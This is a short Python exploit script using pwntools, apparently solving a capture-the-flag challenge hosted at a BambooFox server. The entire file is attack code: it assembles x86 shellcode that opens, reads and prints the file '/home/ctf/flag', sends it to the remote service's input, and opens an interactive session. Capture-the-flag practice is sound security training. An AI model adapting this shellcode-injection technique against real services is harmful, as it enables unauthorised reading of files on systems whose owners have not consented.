#!/usr/bin/env python3
from pwn import *

context(arch='x86', terminal=['tmux', 'neww'])
r = remote('bamboofox.cs.nctu.edu.tw', 11100)
LEN = 64

shellcode = ''
shellcode += shellcraft.open("/home/ctf/flag")
shellcode += shellcraft.read('eax', 'esp', LEN)
shellcode += shellcraft.write(1, 'esp', LEN)

print(asm(shellcode))
r.recvuntil(':')
r.sendline(asm(shellcode))
r.interactive()
